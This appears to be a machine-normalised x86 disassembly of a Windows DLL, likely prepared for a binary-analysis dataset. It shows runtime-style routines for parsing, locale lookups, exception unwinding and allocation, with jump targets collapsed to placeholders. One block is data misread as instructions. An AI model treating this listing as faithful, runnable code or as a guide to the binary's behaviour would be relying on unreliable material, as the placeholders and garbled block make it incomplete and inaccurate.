mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10039dd0
push 0xffffffff
push eax
call sub_10007cf0
jmp r-xdata
pop ebp
retn 0x8
sub_1002e7b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1004cd88
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1004b520
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_1004a7e0
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_1002e877
push 0x38
mov eax sub_1007e7ff
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1004770a
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002a730
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10045daa
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1002e942
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_1001c782
jmp r-xdata
sub_1002e9cf
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005e18
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001108
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001108
add esp 0x14
sub_1002ea40
push ebp
mov ebp esp
push 0xffffffff
push sub_100819c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
mov ebx ecx
lea ecx [ ebp - 0xd4 ]
push edi
push ecx
mov esi edx
mov [ ebp - 0xd8 ] eax
call sub_10027c00
mov edx esi
push eax
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x0
call sub_10045750
push eax
mov edx r--data
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_10045750
push eax
mov edx r--data
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_10045750
mov edx [ ebp - 0xd8 ]
push eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4
call sub_10045750
push eax
mov edx r--data
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x5
call sub_10045750
add esp 0x24
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x6
call sub_10051390
mov esi 0x8
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ebx ebx
xor eax eax
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
cmp [ ebp - 0xa4 ] esi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] esi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_10065045
add esp 0x4
inc [ edi + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xd4 ]
push edx
call sub_10065045
add esp 0x4
sub_1002ec30
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0x3b
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_10024da0
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x94 ]
call sub_1005e3c0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1002ece0
push ebp
mov ebp esp
push 0xffffffff
push sub_100817b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x68 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ edi ] ecx
lea ecx [ edi + 0x4 ]
mov [ ebp - 0x54 ] eax
xor ebx ebx
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] ax
mov eax edx
lea esi [ eax + 0x2 ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x5c ] esi
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax [ ebp - 0x5c ]
sar eax 0x1
push eax
push edx
call sub_1005e3c0
mov eax [ ebp - 0x4c ]
lea ecx [ edi + 0x20 ]
mov [ ebp - 0x4 ] ebx
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
lea edx [ eax + 0x2 ]
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x4c ]
push eax
call sub_1005e3c0
mov cx [ ebp + 0xc ]
mov esi [ ebp - 0x68 ]
mov dl [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ edi + 0x3c ] cx
mov [ edi + 0x3e ] dl
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_1005e3c0
mov edx [ ebp - 0x64 ]
lea ecx [ ebp - 0x2c ]
push ecx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_10045750
push eax
lea esi [ edi + 0x40 ]
mov edx r--data
mov [ ebp - 0x4 ] 0x3
call sub_10045750
add esp 0x8
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov esi 0x7
xor eax eax
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
push 0xffffffff
lea ecx [ edi + 0x5c ]
mov [ ebp - 0x2c ] dx
mov edx [ ebp - 0x58 ]
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ecx ] ax
call sub_1001c310
mov edx [ ebp - 0x50 ]
push 0xffffffff
lea ecx [ edi + 0x78 ]
mov [ ebp - 0x4 ] 0x7
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_1001c310
mov edx [ ebp - 0x60 ]
push 0xffffffff
lea ecx [ edi + 0x94 ]
mov [ ebp - 0x4 ] 0x8
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_1001c310
mov edx [ ebp - 0x54 ]
push 0xffffffff
lea ecx [ edi + 0xb0 ]
mov [ ebp - 0x4 ] 0x9
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_1001c310
mov eax [ ebp + 0x2c ]
mov ecx [ ebp + 0x30 ]
mov [ edi + 0xcc ] eax
mov [ edi + 0xd0 ] ecx
mov [ edi + 0xd4 ] bx
mov [ edi + 0xd6 ] bl
mov [ edi + 0xd8 ] ebx
mov [ edi + 0xdc ] ebx
mov [ edi + 0xe0 ] ebx
mov [ edi + 0xe4 ] 0x3
mov [ edi + 0xe8 ] ebx
mov [ edi + 0xec ] ebx
mov [ edi + 0xf0 ] ebx
mov [ edi + 0xf4 ] ebx
mov [ edi + 0xf8 ] ebx
mov [ ebp - 0x4 ] 0xb
mov ecx edi
mov [ edi + 0x100 ] ebx
mov [ edi + 0x104 ] 0xd
mov [ edi + 0x108 ] 0xf
mov [ edi + 0x10c ] 0x32
call sub_1004ed40
mov eax [ edi + 0xf0 ]
cmp eax [ edi + 0xf4 ]
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
push ebx
push esi
push esi
push ebx
call [ CreateSemaphoreW@IAT ]
mov [ edi + 0xe8 ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x2c
mov edx [ edi + 0x100 ]
lea esp [ esp ]
add eax 0x1c
cmp eax [ edi + 0xf4 ]
jne r-xdata
mov edx ecx
mov [ edi + 0x100 ] edx
mov ecx [ eax + 0x10 ]
cmp ecx edx
jbe r-xdata
sub_1002f016
mov edi edi
push ebp
mov ebp esp
mov dl [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dl
jg r-xdata
cmp [ ebp + 0x14 ] dl
jg r-xdata
movsx ecx [ ebp + 0x10 ]
movsx eax dl
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dl
jg r-xdata
movsx ecx [ ebp + 0x14 ]
movsx eax dl
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movsx ecx [ ebp + 0x18 ]
movsx eax dl
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_1002f069
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100324d8
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1002f096
push 0xc
push r--data
call sub_10078b50
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001e222
push ebx
push esi
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10077d10
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1002a5ac
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1000a080
pop ecx
pop ecx
push eax
push esi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_10078b95
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1000a080
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1002f22b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_100435f4
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_10042683
push eax
push edi
push esi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_10025450
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_1002f2a3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1002f2f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_100284b9
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_10025450
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_10020a90
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_10025450
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_1005d3a9
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_100284b9
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1000b659
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_10020a90
pop ecx
inc esi
push esi
push eax
call sub_10025450
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_10020a90
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_100284b9
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
sub_1002f4a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1002f78f ]
jmp [ eax * 4 + jump_table_1002f733 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b974
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b974
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10041d5f
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b974
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1006773f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b974
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1002f7a6
or [ ebx ] ecx
push ss
push ss
push ss
push ss
push ss
push ss
push ss
add [ ecx ] al
or al 0xd
or eax 0x16011616
push cs
push ss
push ss
movups xmm2 [ esi ]
adc [ esi ] edx
adc dl [ esi ]
adc [ esi ] dl
push ss
adc edx [ edx - 0x3cf7be75 ]
int3
sub_1002f7d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov ecx eax
call sub_1001a670
jmp r-xdata
push 0x20
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
